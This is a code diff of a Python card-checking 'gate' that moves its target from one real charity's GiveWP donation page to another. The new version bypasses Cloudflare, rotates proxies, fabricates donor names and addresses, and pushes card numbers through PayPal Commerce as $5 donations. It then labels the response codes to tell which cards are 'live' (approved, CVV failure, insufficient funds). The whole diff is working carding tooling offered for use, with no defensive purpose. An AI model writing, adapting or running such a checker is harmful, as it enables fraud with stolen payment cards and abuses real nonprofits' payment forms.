@@ -37,129 +37,286 @@ def format_proxy(proxy):
 # ============================================================================
 
 def check_paypal_science(cc, proxy=None):
+    """
+    Improved PayPal Commerce gate (GiveWP) – based on working script.
+    Uses atlanticcitytheatrecompany.com as the target site.
+    """
     try:
-        # 1. Parse Card
+        # 1. Parse card
         cc = cc.strip()
         try:
             n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
             if len(yy) == 4: yy = yy[2:]
         except:
             return "❌ Format Error (Use cc|mm|yy|cvv)", "ERROR"
-        
-        # 2. Setup Session
-        session = requests.Session()
-        formatted_proxy = format_proxy(proxy)
-        if formatted_proxy:
-            session.proxies = formatted_proxy
-        
-        ua = get_random_ua()
-        
-        # 3. Get Tokens (Page Load)
-        headers = {'user-agent': ua}
-        try:
-            r1 = session.get('https://scienceforthechurch.org/donate/', headers=headers, timeout=20)
-        except requests.exceptions.ProxyError:
-            return "❌ Proxy Dead", "ERROR"
-        except requests.exceptions.ConnectionError:
-            return "❌ Connection Error", "ERROR"
-            
-        try:
-            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
-            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
-            nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
-            enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
-            dec = base64.b64decode(enc).decode('utf-8')
-            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-        except AttributeError:
-            return "❌ Scrape Error (Site Changed/Blocked)", "ERROR"
 
-        # 4. Define Payload Data (Dictionary)
-        # We define this here so we can create FRESH encoders for each request
-        payload_data = {
-            'give-form-id': id_form2,
-            'give-form-hash': nonec,
-            'give-price-id': '3',
-            'give-amount': '1.00',
-            'give_first': 'Test',
-            'give_last': 'User',
-            'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
-            'give-gateway': 'paypal-commerce'
-        }
+        # 2. Setup session with cloudscraper (to bypass Cloudflare)
+        import cloudscraper
+        session = cloudscraper.create_scraper()
+        session.verify = False
 
-        # 5. Create Order (WP-Ajax)
+        if proxy:
+            from .gates import format_proxy  # relative import if inside gates.py
+            proxies_dict = format_proxy(proxy)
+            if proxies_dict:
+                session.proxies.update(proxies_dict)
+
+        # Generate random user data (same as script)
+        import random
+        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+        states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
+        street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
+        first_name = random.choice(first_names)
+        last_name = random.choice(last_names)
+        email = f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com"
+        phone = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
+        street_number = random.randint(100, 9999)
+        street_name = random.choice(street_names)
+        street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
+        street_address1 = f"{street_number} {street_name} {street_type}"
+        street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1,999)}"
+        city = random.choice(cities)
+        state_abbr = random.choice(states)
+        zip_code = f"{random.randint(10000,99999)}"
+        amount = "5.00"  # $5 donation
+
+        # 3. Load donation page to get tokens
         headers = {
-            'origin': 'https://scienceforthechurch.org',
-            'referer': 'https://scienceforthechurch.org/donate/',
-            'user-agent': ua,
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+        r = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, timeout=20)
+
+        # Extract required tokens
+        import re, base64
+        ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
+        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
+        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
+
+        enc = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)
+        dec = base64.b64decode(enc).decode('utf-8')
+        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+
+        # 4. First AJAX – process donation (sets up order)
+        headers_ajax = {
+            'authority': 'atlanticcitytheatrecompany.com',
+            'accept': '*/*',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://atlanticcitytheatrecompany.com',
+            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
+            'user-agent': headers['User-Agent'],
             'x-requested-with': 'XMLHttpRequest',
         }
-        
-        # FRESH ENCODER #1
-        mp_data_1 = MultipartEncoder(fields=payload_data)
-        headers['content-type'] = mp_data_1.content_type
-        
-        r2 = session.post(
-            'https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
-            headers=headers, 
-            data=mp_data_1, 
-            timeout=20
-        )
-        
-        try:
-            tok = r2.json()['data']['id']
-        except:
-            return "❌ Order Creation Failed", "DECLINED"
+        data = {
+            'give-honeypot': '',
+            'give-form-id-prefix': ssa00,
+            'give-form-id': ss000a00,
+            'give-form-title': '',
+            'give-current-url': 'https://atlanticcitytheatrecompany.com/donations/donate/',
+            'give-form-url': 'https://atlanticcitytheatrecompany.com/donations/donate/',
+            'give-form-minimum': amount,
+            'give-form-maximum': '999999.99',
+            'give-form-hash': ssa,
+            'give-price-id': 'custom',
+            'give-amount': amount,
+            'give_stripe_payment_method': '',
+            'payment-mode': 'paypal-commerce',
+            'give_first': first_name,
+            'give_last': last_name,
+            'give_email': email,
+            'give_comment': '',
+            'card_name': f"{first_name} {last_name}",
+            'card_exp_month': '',
+            'card_exp_year': '',
+            'billing_country': 'US',
+            'card_address': street_address1,
+            'card_address_2': street_address2,
+            'card_city': city,
+            'card_state': state_abbr,
+            'card_zip': zip_code,
+            'give_action': 'purchase',
+            'give-gateway': 'paypal-commerce',
+            'action': 'give_process_donation',
+            'give_ajax': 'true',
+        }
+        r2 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', headers=headers_ajax, data=data, timeout=20)
 
-        # 6. Confirm Payment Source (PayPal API)
-        headers_pp = {
+        # 5. Second AJAX – create PayPal order (multipart)
+        from requests_toolbelt.multipart.encoder import MultipartEncoder
+        multipart_data = MultipartEncoder({
+            'give-honeypot': (None, ''),
+            'give-form-id-prefix': (None, ssa00),
+            'give-form-id': (None, ss000a00),
+            'give-form-title': (None, ''),
+            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
+            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
+            'give-form-minimum': (None, amount),
+            'give-form-maximum': (None, '999999.99'),
+            'give-form-hash': (None, ssa),
+            'give-price-id': (None, 'custom'),
+            'give-amount': (None, amount),
+            'give_stripe_payment_method': (None, ''),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, first_name),
+            'give_last': (None, last_name),
+            'give_email': (None, email),
+            'give_comment': (None, ''),
+            'card_name': (None, f"{first_name} {last_name}"),
+            'card_exp_month': (None, ''),
+            'card_exp_year': (None, ''),
+            'billing_country': (None, 'US'),
+            'card_address': (None, street_address1),
+            'card_address_2': (None, street_address2),
+            'card_city': (None, city),
+            'card_state': (None, state_abbr),
+            'card_zip': (None, zip_code),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+
+        headers_multipart = {
+            'authority': 'atlanticcitytheatrecompany.com',
+            'accept': '*/*',
+            'content-type': multipart_data.content_type,
+            'origin': 'https://atlanticcitytheatrecompany.com',
+            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
+            'user-agent': headers['User-Agent'],
+        }
+        params = {'action': 'give_paypal_commerce_create_order'}
+        r3 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=multipart_data, timeout=20)
+        order_id = r3.json()['data']['id']
+
+        # 6. Confirm payment source with PayPal
+        headers_paypal = {
+            'authority': 'cors.api.paypal.com',
+            'accept': '*/*',
             'authorization': f'Bearer {au}',
             'content-type': 'application/json',
             'origin': 'https://assets.braintreegateway.com',
             'referer': 'https://assets.braintreegateway.com/',
-            'user-agent': ua
+            'user-agent': headers['User-Agent'],
         }
-        json_data = {
+        json_payload = {
             'payment_source': {
                 'card': {
                     'number': n,
                     'expiry': f'20{yy}-{mm}',
-                    'security_code': cvc
+                    'security_code': cvc,
+                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                 }
-            }
+            },
+            'application_context': {'vault': False}
         }
-        session.post(
-            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
-            headers=headers_pp, 
-            json=json_data, 
-            timeout=20
-        )
+        r4 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=headers_paypal, json=json_payload, timeout=20)
 
-        # 7. Approve Order (WP-Ajax)
-        # FRESH ENCODER #2 (Critical for Mass Check stability)
-        mp_data_2 = MultipartEncoder(fields=payload_data)
-        headers['content-type'] = mp_data_2.content_type
-        
-        r4 = session.post(
-            f'https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}', 
-            headers=headers, 
-            data=mp_data_2, 
-            timeout=20
-        )
-        
-        text = r4.text
-        
-        # 8. Logic
-        if 'true' in text or 'success' in text: return "Charged $1.00", "APPROVED"
-        elif 'INSUFFICIENT_FUNDS' in text: return "Insufficient Funds", "APPROVED"
-        elif 'CVV2_FAILURE' in text: return "CCN Live (CVV Failed)", "APPROVED"
-        elif 'DO_NOT_HONOR' in text: return "Do Not Honor", "DECLINED"
-        elif 'PICKUP_CARD' in text: return "Pickup Card", "DECLINED"
-        elif 'STOLEN' in text: return "Stolen Card", "DECLINED"
-        elif 'INVALID_ACCOUNT' in text: return "Invalid Account", "DECLINED"
-        else: return "Declined (Generic)", "DECLINED"
+        # 7. Final AJAX – approve order (multipart again)
+        multipart_data2 = MultipartEncoder({
+            'give-honeypot': (None, ''),
+            'give-form-id-prefix': (None, ssa00),
+            'give-form-id': (None, ss000a00),
+            'give-form-title': (None, ''),
+            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
+            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
+            'give-form-minimum': (None, amount),
+            'give-form-maximum': (None, '999999.99'),
+            'give-form-hash': (None, ssa),
+            'give-price-id': (None, 'custom'),
+            'give-amount': (None, amount),
+            'give_stripe_payment_method': (None, ''),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, first_name),
+            'give_last': (None, last_name),
+            'give_email': (None, email),
+            'give_comment': (None, ''),
+            'card_name': (None, f"{first_name} {last_name}"),
+            'card_exp_month': (None, ''),
+            'card_exp_year': (None, ''),
+            'billing_country': (None, 'US'),
+            'card_address': (None, street_address1),
+            'card_address_2': (None, street_address2),
+            'card_city': (None, city),
+            'card_state': (None, state_abbr),
+            'card_zip': (None, zip_code),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+
+        headers_multipart2 = {
+            'authority': 'atlanticcitytheatrecompany.com',
+            'accept': '*/*',
+            'content-type': multipart_data2.content_type,
+            'origin': 'https://atlanticcitytheatrecompany.com',
+            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
+            'user-agent': headers['User-Agent'],
+        }
+        params2 = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
+        r5 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', params=params2, headers=headers_multipart2, data=multipart_data2, timeout=20)
+
+        text = r5.text
+
+        # 8. Parse response
+        if 'true' in text:
+            return f"Thank You For Your Donation (${amount})", "APPROVED"
+        elif 'DO_NOT_HONOR' in text:
+            return "Do Not Honor", "DECLINED"
+        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
+            return "Account Closed", "DECLINED"
+        elif 'LOST_OR_STOLEN' in text:
+            return "Lost or Stolen", "DECLINED"
+        elif 'CVV2_FAILURE' in text:
+            return "CCN Live (CVV Failed)", "APPROVED"
+        elif 'SUSPECTED_FRAUD' in text:
+            return "Suspected Fraud", "DECLINED"
+        elif 'INVALID_ACCOUNT' in text:
+            return "Invalid Account", "DECLINED"
+        elif 'REATTEMPT_NOT_PERMITTED' in text:
+            return "Reattempt Not Permitted", "DECLINED"
+        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
+            return "Account Blocked", "DECLINED"
+        elif 'ORDER_NOT_APPROVED' in text:
+            return "Order Not Approved", "DECLINED"
+        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
+            return "Pickup Card", "DECLINED"
+        elif 'PAYER_CANNOT_PAY' in text:
+            return "Payer Cannot Pay", "DECLINED"
+        elif 'INSUFFICIENT_FUNDS' in text:
+            return "Insufficient Funds", "APPROVED"
+        elif 'GENERIC_DECLINE' in text:
+            return "Generic Decline", "DECLINED"
+        elif 'COMPLIANCE_VIOLATION' in text:
+            return "Compliance Violation", "DECLINED"
+        elif 'TRANSACTION_NOT_PERMITTED' in text:
+            return "Transaction Not Permitted", "DECLINED"
+        elif 'PAYMENT_DENIED' in text:
+            return "Payment Denied", "DECLINED"
+        elif 'INVALID_TRANSACTION' in text:
+            return "Invalid Transaction", "DECLINED"
+        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
+            return "Restricted/Inactive Account", "DECLINED"
+        elif 'SECURITY_VIOLATION' in text:
+            return "Security Violation", "DECLINED"
+        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
+            return "Declined – Updated Account", "DECLINED"
+        elif 'INVALID_OR_RESTRICTED_CARD' in text:
+            return "Invalid or Restricted Card", "DECLINED"
+        elif 'EXPIRED_CARD' in text:
+            return "Expired Card", "DECLINED"
+        elif 'CRYPTOGRAPHIC_FAILURE' in text:
+            return "Cryptographic Failure", "DECLINED"
+        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
+            return "Cannot Complete", "DECLINED"
+        elif 'DECLINED_PLEASE_RETRY' in text:
+            return "Declined – Retry Later", "DECLINED"
+        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
+            return "Exceeded Limit", "DECLINED"
+        else:
+            try:
+                err = r5.json()['data']['error']
+                return f"Declined: {err}", "DECLINED"
+            except:
+                return "Unknown Error", "ERROR"
 
     except Exception as e:
-        return f"Error: {str(e)}", "ERROR"
+        return f"Process Error: {str(e)}", "ERROR"
 
 # ============================================================================
 # 🚪 GATE 2: PayPal Commerce (SFTS)
